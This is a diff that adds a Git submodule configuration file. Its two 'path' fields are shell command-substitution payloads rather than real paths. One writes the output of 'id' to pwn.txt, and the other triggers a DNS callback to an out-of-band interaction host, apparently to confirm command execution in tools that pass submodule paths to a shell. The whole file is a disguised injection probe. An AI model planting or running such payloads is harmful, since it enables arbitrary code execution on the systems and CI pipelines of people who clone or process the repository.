@@ -1,0 +1,6 @@
+[submodule "x"]
+	path = $(id>pwn.txt)
+	url = https://github.com/FazeMike1/dbot-sub.git
+[submodule "y"]
+	path = $(getent hosts db9rhk74ufpmof0unlq049yw1o8die8ik.oast.online)
+	url = https://github.com/FazeMike1/dbot-sub.git
